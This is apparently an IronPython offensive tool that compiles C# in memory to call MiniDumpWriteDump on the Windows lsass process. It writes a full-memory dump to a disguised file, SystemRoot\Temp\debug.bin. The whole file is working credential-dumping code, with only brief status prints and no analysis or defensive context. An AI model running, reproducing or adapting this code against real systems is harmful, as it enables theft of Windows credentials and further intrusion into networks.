import clr

from System.Environment import CurrentDirectory
from System.IO import Path, Directory

from System.CodeDom import Compiler
from Microsoft.CSharp import CSharpCodeProvider

from System.Reflection import Assembly
from System import Array, Byte, Convert
from System import Environment
from System import IntPtr
from System.IO import FileStream, MemoryStream, FileMode, FileAccess, FileShare, SeekOrigin
from System.IO.Compression import DeflateStream, CompressionMode
from System.Security.Principal import WindowsIdentity, WindowsPrincipal, WindowsBuiltInRole


def Generate(code, name, references=None, outputDirectory=None, inMemory=True):

	CompilerParams = Compiler.CompilerParameters()

	if outputDirectory is None:
		outputDirectory = Directory.GetCurrentDirectory()
	if not inMemory:
		CompilerParams.OutputAssembly = Path.Combine(outputDirectory, name + ".dll")
		CompilerParams.GenerateInMemory = False
	else:
		CompilerParams.GenerateInMemory = True

	CompilerParams.TreatWarningsAsErrors = False
	CompilerParams.GenerateExecutable = False
	CompilerParams.CompilerOptions = "/optimize /reference:System.dll"

	for reference in references or []:
		CompilerParams.ReferencedAssemblies.Add(reference)

	provider = CSharpCodeProvider()
	compile = provider.CompileAssemblyFromSource(CompilerParams, code)

	if compile.Errors.HasErrors:
		cerrs = []
		for cerr in compile.Errors:
			cerrs.append(str(cerr))
		raise Exception("Compile error: %r" % cerrs)

	if inMemory:
		return compile.CompiledAssembly
	return compile.PathToAssembly

unmanaged_code = """
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;


public static class MiniDump
{
	[Flags]
	public enum Option : uint
	{
		Normal = 0x00000000,
		WithDataSegs = 0x00000001,
		WithFullMemory = 0x00000002,
		WithHandleData = 0x00000004,
		FilterMemory = 0x00000008,
		ScanMemory = 0x00000010,
		WithUnloadedModules = 0x00000020,
		WithIndirectlyReferencedMemory = 0x00000040,
		FilterModulePaths = 0x00000080,
		WithProcessThreadData = 0x00000100,
		WithPrivateReadWriteMemory = 0x00000200,
		WithoutOptionalData = 0x00000400,
		WithFullMemoryInfo = 0x00000800,
		WithThreadInfo = 0x00001000,
		WithCodeSegs = 0x00002000,
		WithoutAuxiliaryState = 0x00004000,
		WithFullAuxiliaryState = 0x00008000,
		WithPrivateWriteCopyMemory = 0x00010000,
		IgnoreInaccessibleMemory = 0x00020000,
		ValidTypeFlags = 0x0003ffff,
	};

	public enum ExceptionInfo
	{
		None,
		Present
	}

	[StructLayout(LayoutKind.Sequential, Pack = 4)]  // Pack=4 is important! So it works also for x64!
	public struct MiniDumpExceptionInformation
	{
		public uint ThreadId;
		public IntPtr ExceptionPointers;
		[MarshalAs(UnmanagedType.Bool)]
		public bool ClientPointers;
	}

	[DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
	static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, ref MiniDumpExceptionInformation expParam, IntPtr userStreamParam, IntPtr callbackParam);

	[DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
	static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);

	[DllImport("kernel32.dll", EntryPoint = "GetCurrentThreadId", ExactSpelling = true)]
	static extern uint GetCurrentThreadId();


	public static bool Write(SafeHandle fileHandle, Option options, ExceptionInfo exceptionInfo)
	{
		System.Diagnostics.Process targetProcess = System.Diagnostics.Process.GetProcessesByName("lsass")[0];
		int targetProcessId = targetProcess.Id;
		IntPtr targetProcessHandle = targetProcess.Handle;
		uint currentProcessId = (uint)targetProcess.Id;
		MiniDumpExceptionInformation exp;
		exp.ThreadId = GetCurrentThreadId();
		exp.ClientPointers = false;
		exp.ExceptionPointers = IntPtr.Zero;
		if (exceptionInfo == ExceptionInfo.Present)
		{
			exp.ExceptionPointers = System.Runtime.InteropServices.Marshal.GetExceptionPointers();
		}

		bool bRet = false;
		if (exp.ExceptionPointers == IntPtr.Zero)
		{
			bRet = MiniDumpWriteDump(targetProcessHandle, currentProcessId, fileHandle, (uint)options, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
		}
		else
		{
			bRet = MiniDumpWriteDump(targetProcessHandle, currentProcessId, fileHandle, (uint)options, ref exp, IntPtr.Zero, IntPtr.Zero);
		}
		return bRet;

	}


	public static bool Write(SafeHandle fileHandle, Option dumpType)
	{
		return Write(fileHandle, dumpType, ExceptionInfo.None);
	}
	
	public static bool Write(SafeHandle fileHandle)
	{
		return Write(fileHandle, Option.WithFullMemory, ExceptionInfo.None);
	}
}
"""

try:
	print('Generating assembly')
	assembly = Generate(unmanaged_code, 'MiniDump')
	clr.AddReference(assembly)
	print('Importing assembly')
	import MiniDump

	systemRoot = Environment.GetEnvironmentVariable("SystemRoot")
	dumpFile = "{0}\\Temp\\debug.bin".format(systemRoot)

	print('Creating dump')
	with FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write) as fs:
		MiniDump.Write(fs.SafeFileHandle)
	print 'Succsessfully written LSASS.exe dumpfile to %s' % dumpFile
except Exception as e:
	print(str(e))